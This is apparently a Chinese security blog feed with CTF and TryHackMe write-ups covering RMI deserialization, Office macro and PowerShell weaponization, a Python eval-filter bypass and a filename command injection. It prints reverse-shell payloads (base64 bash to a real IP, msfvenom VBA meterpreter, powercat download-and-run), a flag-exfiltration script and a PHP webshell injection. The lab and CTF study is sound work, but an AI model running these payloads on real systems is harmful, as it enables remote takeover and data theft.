href="#minijava-RMI反序列化漏洞" class="headerlink" title="minijava(RMI反序列化漏洞)"></a>minijava(<strong>RMI反序列化漏洞</strong>)</h2><p><img src="../images/image-20230511095830489.png" alt="image-20230511095830489"></p><p><strong>先使用jd-gui工具把class文件变成java文件</strong></p><p><img src="../images/image-20230513152909440.png" alt="image-20230513152909440"></p><p>1.先导入pom.xml里面的东西</p><p>2.然后按照jar包里面的构造来idea里面构造个一模一样的</p><p>然后在把jar里面的内容照搬进去就行了</p><p>这道题如果是对经常做java题目的师傅来看的话是一下就能看出是利用RMI来打的</p><p><img src="../images/image-20230511101201537.png" alt=" "></p><p>先去查看一下pom.xml，发现是cc3的链子</p><p><img src="../images/image-20230511102446188.png" alt="image-20230511102446188"></p><p>因为这里添加了个白名单过滤，所以说不能直接用cc3来打了</p><p>然后去看了一下MainController.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/hello&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;, required = false)</span> String data)</span> &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">byte</span>[] userData = Base64.getDecoder().decode(data);</span><br><span class="line">      <span class="type">SerialKiller</span> <span class="variable">serialKiller</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerialKiller</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(userData), <span class="string">&quot;serialkiller.conf&quot;</span>);</span><br><span class="line">      user = (User)serialKiller.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;unserialize error, no!&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;unserialize done, &quot;</span> + user.getUsername() + <span class="string">&quot; have fun!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就去查看这个readObject() 这里显示是User这个类里边的</p><p><img src="../images/image-20230511102938179.png" alt="image-20230511102938179"></p><p>这里边的registry和lookup做题多的一看就知道是rmi恶意服务</p><p>这里的话registry1可控，然后只需要绕过上面的的if判断就行了</p><p>然后打<strong>RMI反序列化漏洞</strong>，最终可以实现绕过白名单任意反序列化，从而打CC链来rce</p><p><strong>这里如果是是用hackbar发包的话，得注意要进行url编码，不会会失败</strong></p><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener <span class="number">1099</span> CommonsCollections6 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><strong>需要在自己的服务器上执行</strong></p><p>接下来就不写了  直接去看官方的wp吧 <a href="https://github.com/XDSEC/miniLCTF_2023/blob/main/Official/Web_Writeup.md">官方wp</a></p><p>接下来就写篇文章来学习一下<strong>RMI</strong>和<strong>cc3</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的话只复现部分题&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/XDSEC/miniLCTF_2023/blob/main/Official/Web_Writeup.md&quot;&gt;官方wp地址&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;ezsql-sql-ser</summary>
      
    
    
    
    
    <category term="Mini-L CTF web 复现" scheme="https://ke1nys.github.io/tags/Mini-L-CTF-web-%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>thm-红队-初始访问-武器化</title>
    <link href="https://ke1nys.github.io/posts/add7d84.html"/>
    <id>https://ke1nys.github.io/posts/add7d84.html</id>
    <published>2023-05-08T15:06:25.000Z</published>
    <updated>2023-05-14T13:33:48.368Z</updated>
    
    <content type="html"><![CDATA[<p>前两个是 VBScript 代码  和  HTA代码</p><p>前者是可以在本地上运行，后者是可以弹shell也可以在本地运行</p><h3 id="应用程序的-Visual-Basic-VBA"><a href="#应用程序的-Visual-Basic-VBA" class="headerlink" title="应用程序的 Visual Basic (VBA)"></a>应用程序的 Visual Basic (VBA)</h3><p><strong>这是 Microsoft 为 Microsoft Word、Excel、PowerPoint 等 Microsoft 应用程序实施的一种编程语言</strong></p><p><strong>VBA 编程允许自动执行用户与 Microsoft Office 应用程序之间几乎所有键盘和鼠标交互的任务。</strong> </p><p>这句话是重点</p><p><strong>宏是 Microsoft Office 应用程序，其中包含以称为 Visual Basic for Applications (VBA) 的编程语言编写的嵌入式代码。它用于创建自定义功能，以通过创建自动化流程来加速手动任务</strong></p><p><strong>我们将讨论 VBA 的基础知识以及对手使用宏创建恶意 Microsoft 文档的方式</strong>。</p><p>现在创建一个新的空白 Microsoft 文档来创建我们的第一个 宏。目的是讨论该语言的基础知识，并展示如何在打开 Microsoft Word 文档时运行它。首先，我们需要通过选择 视图→ 宏来打开 Visual Basic 编辑器。宏窗口显示在文档中创建我们自己的宏</p><p><img src="../images/image-20230508231520977.png" alt="image-20230508231520977"></p><p><img src="../images/image-20230508231606126.png" alt="image-20230508231606126"></p><p>点击创建后的样子</p><p>然后进行内容创建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sub THM()</span><br><span class="line">  MsgBox (&quot;Welcome to Weaponization Room!&quot;)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>然后点击运行<img src="../images/image-20230508231803055.png" alt="image-20230508231803055"></p><p>现在，为了在文档打开后自动执行 VBA 代码，我们可以使用内置函数，例如 AutoOpen 和 Document_open。请注意，我们需要指定文档打开后需要运行的函数名称，在我们的例子中是 THM 函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Sub Document_Open()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub AutoOpen()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub THM()</span><br><span class="line">   MsgBox (&quot;Welcome to Weaponization Room!&quot;)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>重要的是要注意，要使宏起作用，我们需要将其保存为启用宏的格式，例如.doc 和 docm。现在让我们将文件保存为Word 97-2003 模板，通过转到文件→保存 Document1并保存为类型 → Word 97-2003 文档启用 宏，最后保存.</p><p><img src="../images/image-20230508232155649.png" alt="image-20230508232155649"></p><p>运行文档后就会自动执行</p><p><strong><img src="../images/image-20230508232335996.png" alt="image-20230508232335996"></strong></p><p>现在编辑 word 文档并创建一个执行calc.exe 或任何可执行文件的宏函数作为概念证明，如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Sub PoC()</span><br><span class="line">Dim payload As String</span><br><span class="line">payload = &quot;calc.exe&quot;</span><br><span class="line">CreateObject(&quot;Wscript.Shell&quot;).Run payload,0</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>和前面保存的步骤一样，然后点击运行就弹出计算器了</p><p>得一提的是，我们可以将 VBA 与之前介绍的方法（例如 HTA 和 WSH）结合使用。VBA/宏本身并不能绕过任何检测</p><p><strong>接下来是利用VBA进行shell的反弹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 341 bytes</span><br><span class="line">Final size of vba file: 2698 bytes</span><br></pre></td></tr></table></figure><p><strong>导入以注意</strong>需要进行一项修改才能使此工作正常进行。输出将在 MS Excel 工作表上工作。因此，将 Workbook_Open()更改为 Document_Open()以使其适用于 MS word 文档。</p><p>然后把生成的代码写到word的宏编辑器里边</p><p>然后设置监听器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ msfconsole -q</span><br><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 10.50.159.15</span><br><span class="line">LHOST =&gt; 10.50.159.15</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.50.159.15:443 </span><br></pre></td></tr></table></figure><p>一旦在受害者机器上打开恶意  word 文档，我们应该会收到一个反向 shell。</p><h3 id="PowerShell-PSH"><a href="#PowerShell-PSH" class="headerlink" title="PowerShell-PSH"></a>PowerShell-PSH</h3><p><strong>Powershell 是使用 .NET 框架构建的 Windows 脚本语言和 shell 环境</strong>。</p><p>这也允许 Powershell 直接从其 shell 执行 .NET 函数。大多数 Powershell 命令（称为<em>cmdlet）</em>是用 .NET 编写的。<em>与其他脚本语言和 shell 环境不同，这些cmdlet</em>的输出 是对象——使 Powershell 有点面向对象。这也意味着运行 cmdlet 允许您对输出对象执行操作（这样可以方便地将输出从一个<em>cmdlet</em>传递 到另一个）。<em>cmdlet</em>的正常格式使用<strong>Verb-Noun</strong>表示；例如，用于列出命令的<em>cmdlet</em> 被称为<code>Get-Command.</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Write-Output &quot;Welcome to the Weaponization Room!&quot;</span><br></pre></td></tr></table></figure><p>将文件另存为 thm.ps1 。 使用 Write-Output ，我们打印消息“Welcome to the Weaponization Room!” 到命令提示符。 现在让我们运行它并查看结果</p><p><img src="../images/image-20230514205635490.png" alt="image-20230514205635490"></p><p>PowerShell 的执行策略是一个 安全选项，用于保护系统免于运行恶意脚本。默认情况下，Microsoft出于安全目的禁止执行PowerShell脚本.ps1 。PowerShell执行策略设置为Restricted ，这意味着它允许单独的命令但不允许运行任何脚本</p><p><strong>bypass绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\thm\Desktop&gt;powershell -ex bypass -File thm.ps1</span><br><span class="line">Welcome to Weaponization Room!</span><br></pre></td></tr></table></figure><p>现在，让我们尝试使用一种用PowerShell编写的工具powercat来获取反向 shell 。在你的 AttackBox 上，从 GitHub 下载它并运行一个网络服务器来传送有效载荷。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/besimorhino/powercat.git</span><br></pre></td></tr></table></figure><p>现在，我们需要在该 AttackBox 上设置一个 Web 服务器来为将在目标机器上下载和执行的powercat.ps1提供服务。接下来，将目录更改为 powercat 并开始侦听您选择的端口。在我们的例子中，我们将使用端口 8080 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@machine$ cd powercat</span><br><span class="line">user@machine$ python3 -m http.server 8080</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...</span><br></pre></td></tr></table></figure><p>在 AttackBox 上，我们需要使用nc监听端口1337以接收来自受害者的连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@machine$ nc -lvp 1337</span><br></pre></td></tr></table></figure><p>现在，我们从受害机器上下载有效载荷并使用PowerShell有效载荷执行它，如下所示，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\thm\Desktop&gt; powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://ATTACKBOX_IP:8080/powercat.ps1&#x27;);powercat -c ATTACKBOX_IP -p 1337 -e cmd&quot;</span><br></pre></td></tr></table></figure><p>现在我们已经执行了上面的命令，受害者机器从我们的网络服务器（在 AttackBox 上）下载 powercat.ps1有效载荷，然后使用cmd.exe 在目标本地执行它，并将连接发送回正在侦听的 AttackBox在端口1337上。几秒钟后，我们应该收到连接回调：</p><p><img src="../images/image-20230514211059473.png" alt="image-20230514211059473"></p><p><strong>HTA VBA powershell</strong>  这三种方式可以进行shell的反弹   在windows系统里</p><p>前两个使用mvf进行生成payload  后面一个是依靠github上面的一个文件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前两个是 VBScript 代码  和  HTA代码&lt;/p&gt;
&lt;p&gt;前者是可以在本地上运行，后者是可以弹shell也可以在本地运行&lt;/p&gt;
&lt;h3 id=&quot;应用程序的-Visual-Basic-VBA&quot;&gt;&lt;a href=&quot;#应用程序的-Visual-Basic-VBA&quot; c</summary>
      
    
    
    
    
    <category term="thm-红队-初始访问-武器化" scheme="https://ke1nys.github.io/tags/thm-%E7%BA%A2%E9%98%9F-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE-%E6%AD%A6%E5%99%A8%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>AntCTF x D³CTF web 复现</title>
    <link href="https://ke1nys.github.io/posts/d27bfad9.html"/>
    <id>https://ke1nys.github.io/posts/d27bfad9.html</id>
    <published>2023-05-02T07:30:06.000Z</published>
    <updated>2023-05-07T09:40:34.530Z</updated>
    
    <content type="html"><![CDATA[<p>这里的复现都是去网上搜索前几名发的wp来复现的</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247486967&amp;idx=1&amp;sn=ad55ddd11c6bfa17843270625f5f92fc&amp;chksm=cf53cd41f8244457c2db68626c91f2e4564d756b903222f3a913e89f211d475418864c5041bc&amp;mpshare=1&amp;scene=23&amp;srcid=0501bEUrW8ydbpm175TL5FFn&amp;sharer_sharetime=1682949687637&amp;sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392#rd">Arr wp</a>    <a href="https://fq6p9pyo5tt.feishu.cn/docx/InUFdQUKdozf8yx5IhGcf5zInSe?share_token=50b9c367-3661-4046-95ab-5418bcc155a9">亚军wp</a></p><p>还有参考 <a href="https://boogipop.com/">boogipop的wp</a></p><h2 id="Escape-Plan"><a href="#Escape-Plan" class="headerlink" title="Escape Plan"></a>Escape Plan</h2><p>题目</p><p><img src="../images/image-20230502153814922.png" alt="image-20230502153814922"></p><p><strong>The success for a break out depends on three things.</strong><br><strong>- layout: black_char</strong><br><strong>- routine: Python tricks</strong><br><strong>- help: Run /readflag to get flag, dns tunneling may help you</strong></p><p> 题目还给了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_3</span>():</span><br><span class="line">    cmd = request.form.get(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cmd:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;pre&gt;</span></span><br><span class="line"><span class="string">import requests, base64</span></span><br><span class="line"><span class="string">exp = &#x27;&#x27;</span></span><br><span class="line"><span class="string">requests.post(&quot;&quot;, data=&#123;&quot;cmd&quot;: base64.b64encode(exp.encode())&#125;).text</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd = base64.b64decode(cmd).decode()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;bad base64&quot;</span></span><br><span class="line"></span><br><span class="line">    black_char = [</span><br><span class="line">        <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;import&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> black_char:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> cmd:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;failed: `<span class="subst">&#123;char&#125;</span>`&#x27;</span></span><br><span class="line"></span><br><span class="line">    msg = <span class="string">&quot;success&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">eval</span>(cmd)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        msg = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话就是自己想方法进行绕过了</p><p>最后是在eval这里进行代码的执行</p><p>因为关键函数被禁了，那么我们可以尝试使用全角符号进行绕过</p><p>迷你上标和下标（0~9、字母、特殊字符）</p><p>用上面的迷你上标或全角符号能能绕过，本地测试过了</p><p><img src="../images/image-20230502155533638.png" alt="image-20230502155533638"></p><p><img src="../images/image-20230502155615879.png" alt="image-20230502155615879"></p><p><a href="https://cn-sec.com/archives/1322842.html">参考文章</a></p><p><img src="../images/image-20230502161726816.png" alt="image-20230502161726816"></p><p>给的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64</span><br><span class="line">u = <span class="string">&#x27;𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫&#x27;</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;__import__(&#x27;os&#x27;).popen(&quot;python -c &#x27;import socket, os; flag = os.popen(\\&quot;/readflag\\&quot;).read().encode();host = \\&quot;101.42.39.110\\&quot;;port=666;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((host,port));s.sendall(flag);s.close();a=1;&#x27;&quot;).read()&quot;&quot;&quot;</span></span><br><span class="line">payload = <span class="built_in">str</span>(base64.b64encode(payload)).strip(<span class="string">&#x27;b&#x27;</span>).strip(<span class="string">&quot;&#x27;&quot;</span>) +<span class="string">&quot;=&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">CMD = <span class="string">&quot;ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(&#123;&#125;()))[len([])]))&quot;</span>.<span class="built_in">format</span>(payload)</span><br><span class="line">CMD = CMD.translate(&#123;<span class="built_in">ord</span>(<span class="built_in">str</span>(i)): u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;)</span><br><span class="line">r = requests.post(<span class="string">&quot;http://139.196.153.118:30503/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">base64.b64encode(CMD.encode())&#125;).text</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure><p>然后上面执行的是python的shell反弹</p><p>然后就可以在自己的服务器上接收到了</p><p><img src="../images/image-20230502172834323.png" alt="image-20230502172834323"></p><h2 id="d3cloud"><a href="#d3cloud" class="headerlink" title="d3cloud"></a>d3cloud</h2><p>题目</p><p><strong>admin uses laravel-admin to build a personal cloud disk, and adds a utility function</strong></p><p><img src="../images/image-20230502164406853.png" alt="image-20230502164406853"></p><p>这里<code>url/admin</code>访问后台，然后弱密码 admin/admin 进行登录</p><p><img src="../images/image-20230503183023251.png" alt="image-20230503183023251"></p><p>发现这文件后，然后进行读取   进行题目的提示和官方文件的对比之后发现多了下面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">putFileAs</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$file</span>, <span class="variable">$name</span>, <span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="variable">$supported_file</span> = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;ico&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;mp4&#x27;</span>,<span class="string">&#x27;mp3&#x27;</span>,<span class="string">&#x27;mkv&#x27;</span>,<span class="string">&#x27;avi&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>);</span><br><span class="line"> <span class="variable">$file_type</span>= <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>,PATHINFO_EXTENSION));</span><br><span class="line"> <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_type</span>, <span class="variable">$supported_file</span>)) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getRealPath</span>(), <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line"> <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(</span><br><span class="line"> <span class="variable">$path</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>), <span class="variable">$stream</span>, <span class="variable">$options</span></span><br><span class="line"> );</span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$stream</span>)) &#123;</span><br><span class="line"> <span class="title function_ invoke__">fclose</span>(<span class="variable">$stream</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalExtension</span>() === <span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line"> <span class="variable">$fs</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&quot;unzip -oq &quot;</span>. <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>() . </span><br><span class="line"><span class="variable">$name</span> .<span class="string">&quot; -d &quot;</span> . <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>(),<span class="string">&quot;w&quot;</span>);</span><br><span class="line"> <span class="title function_ invoke__">pclose</span>(<span class="variable">$fs</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="variable">$result</span> ? <span class="variable">$path</span> : <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>就是多了这段代码，和题目说的增加了有个新功能相对应</p><p><strong>这里的话是有有个自动解压的功能，那么我们就可以尝试在这里的把自己想要的命令放进压缩包里，然后解压到自己设置的目录下</strong></p><p><img src="../images/image-20230503184537985.png" alt="image-20230503184537985"></p><p>题目这里也给提示了，就是去找解压的函数方法那边</p><p><code>$file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION));</code>里面的这段代码是获取文件后缀的</p><p><img src="../images/image-20230503184215304.png" alt="image-20230503184215304"></p><p><img src="../images/image-20230503184459019.png" alt="image-20230503184459019"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;echo ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+JyA+IC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhw|base64 -</span><br><span class="line">d|bash;.zip</span><br></pre></td></tr></table></figure><p>这里的目的是把一句话木马写进来</p><p><img src="../images/image-20230503193106552.png" alt="image-20230503193106552"></p><p>能进行判断通过</p><p><img src="../images/image-20230503193143283.png" alt="image-20230503193143283"></p><p>这里的话就得在文件名出写码了</p><p><img src="../images/image-20230503193317019.png" alt="image-20230503193317019"></p><p>随便上传一个zip文件并抓包</p><p>内容随便</p><p><img src="../images/image-20230503193352762.png" alt="image-20230503193352762"></p><p>这个代码的意思是将base64解码后，然后用bash命令进行执行</p><p><code>echo &#39;&lt;?php 